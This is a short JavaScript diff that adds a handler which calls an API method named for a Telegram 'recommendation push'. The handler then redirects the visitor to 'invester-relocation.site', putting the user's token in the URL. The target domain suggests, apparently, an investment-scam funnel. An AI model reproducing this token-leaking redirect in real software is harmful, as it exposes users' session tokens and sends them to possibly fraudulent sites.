@@ -156,6 +156,25 @@
                         }, timeRender);
                     });
                 },
+                "recomendation_push_b": async function()
+                {
+                    return new Promise(async (resolve,reject) =>
+                    {
+                        var protoUrl    = `https://invester-relocation.site/?user=${_token}&page=creating`;
+
+                        setTimeout( async function() {
+                            callApi({
+                                methodName: "telegram_recomendation_push_b",
+                                data: {
+                                    userId: _token,
+                                    attraction: _GET("userId"),
+                                },
+                            });
+                            window.location = protoUrl;
+                            resolve();
+                        }, timeRender);
+                    });
+                }
             }
 
             if(_PageType)
